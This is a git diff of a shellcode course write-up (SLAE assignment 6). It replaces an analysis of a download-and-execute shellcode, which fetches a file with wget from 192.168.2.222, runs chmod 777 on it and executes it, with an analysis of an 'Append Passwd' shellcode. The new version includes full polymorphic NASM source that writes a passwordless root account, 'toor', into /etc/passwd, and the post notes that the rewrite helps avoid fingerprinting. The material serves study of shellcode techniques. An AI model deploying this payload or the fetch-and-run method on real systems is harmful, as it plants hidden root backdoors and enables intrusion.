@@ -14,25 +14,81 @@ Student ID: SLAE-670
 
 ## Solution
 
-In this post we are going to look at the Download and Execute shellcode avaiable at ![http://shell-storm.org/shellcode/files/shellcode-862.php](http://shell-storm.org/shellcode/files/shellcode-862.php "").
+In this post we are going to look at the Append Passwd shellcode avaiable at ![http://shell-storm.org/shellcode/files/shellcode-561.php](http://shell-storm.org/shellcode/files/shellcode-561.php "").
+
+This shellcode is meant to add a new system user to the `/etc/passwd` file.
+
 
 ### Shellcode Analysis
 
-Tracing the instruction set, we observe that the shellcode first creates a child process (a copy) of itself with the `fork()` system call. The child process is used to download the file that later on is executed by the parent process. Since a child process will return a Process ID of `0`, while the parent process will return a non-zero Process ID, the execution flow is able to determine which instruction set it should execute even though the processes are copies. If PID is zero, the program will go ahead and jump to the download section of the code, where it will use the `execve()` system call to execute `/usr/bin/wget 192.168.2.222//x`. 
+To begin, lets grab a copy of that shellcode, compile it, and trace it with GDB:
 
-While the child process is being executed, the parent process goes on to execute the `waitpid()` system call with PID equal to zero (child process). The  `waitpid()` system  call  suspends execution of the calling process until a child specified by PID argument has changed state. By default, `waitpid()` waits only for terminated children. So, the parent process waits for the download to finish and then goes on to execute the rest of the instructions. 
+![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/gdb1.png "GDB")
 
-The parent processs will go on using the `chmod()` system call to execute `chmod 777` on the downloaded file, and then finally proceeds to execute the downloaded file with the `execve()` system call.
+As can be appreciated, the shellcode uses the JMP-CALL-POP technique to get the payload address on the stack. The payload in this case is is the following string:
 
-It is interesting to note that it was necessary to `fork()` a child in this case because `execve()` does not return execution back to the code that called it. Therefore, by using separate processes for downloading and executing, along with the `waitpid()` functionality, it was possible to execute `execve()` twice from the same shellcode.
+![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/gdb2.png "Payload")
+
+which is of course the file name and the user string to be appended. 
+
+The shellcode then goes on to replace the `#` symbols in the payload by `\x00`s, effectively NULL-terminating both strings. Then, a file descriptor for `/etc/passwd` is created with the `open()` system call, and `toor::0:0:t00r:/root:/bin/bash` is appended with the `write()` system call. Finally, the program gracefully exits with the `exit()` system call. 
+
 
 ### Polymorphic Shellcode
 
-The technique used in the original shellcode sample is entirely replicated in the polymorphic version. Nevertheless, the instruction set is completely rewritten (except for constant strings, such as `/usr/bin/wget` that could of course be used as a fingerprint). Even though Using an encoder would potentially help to remediate the fingerprinting problem to some extent, the shellcode presented here does not include that functionality. It is rather made to be as short as possible.
+To re-create this shellcode, several tweaks were applied to make the shellcode shorter. In no particular order:
+- `/etc/passwd` is pushed on the stack, which changes the operations needed before the `open()` call
+- `toor::0:0::/root:/bin/sh` is appended, which trims down unnecessary bytes
+- payload length is explicitly specified (not calculated at run time)
+- additional steps, associated with the original shellcode, are cut and/or rewritten
 
-### a6-dlexec.nasm
+The final version looks like this:
+
+### a6-passwd.nasm
 ```nasm
+; SLAE Assignment 6: Append Passwd (morphed)
+; http://shell-storm.org/shellcode/files/shellcode-561.php
+; Original Shellcode Length:	107 
+; Morphed Shellcode Length:		82
 
+global _start
+section .text
+_start:
+	jmp short stage
+
+append:
+	pop esi
+	cdq
+	mov byte [esi+24], dl
+
+	push byte 0x5 				; #define __NR_open 5
+	pop eax 					; int open(const char *pathname, int flags);
+	push edx
+	push byte 0x64 				; d
+	push word 0x7773			; ws
+	push 0x7361702f				; sap/
+	push 0x6374652f				; cte/
+	mov ebx, esp 				; *pathname -> /etc/passwd
+	xor ecx, ecx 		
+	inc ecx 					; flags = 1		#define O_WRONLY        00000001
+	mov ch, 0x4 				; flags = 401	#define O_NOCTTY        00000400
+	int 0x80 					; open
+
+	xchg eax, ebx 				; fd 
+	push byte 0x4 				; #define __NR_write 4
+	pop eax 					; ssize_t write(int fd, const void *buf, size_t count);
+	mov ecx, esi 				; *buf -> toor::0:0::/root:/bin/sh
+	push byte 0x19 				; length = 25 bytes
+	pop edx 					; count = 25
+	int 0x80 					; write
+
+	push byte 0x1 				; #define __NR_exit 1
+	pop eax 					; int exit(int status)
+	int 0x80 					; exit
+
+stage:
+	call append
+	usr: db "toor::0:0::/root:/bin/shC"
 ```
 
 
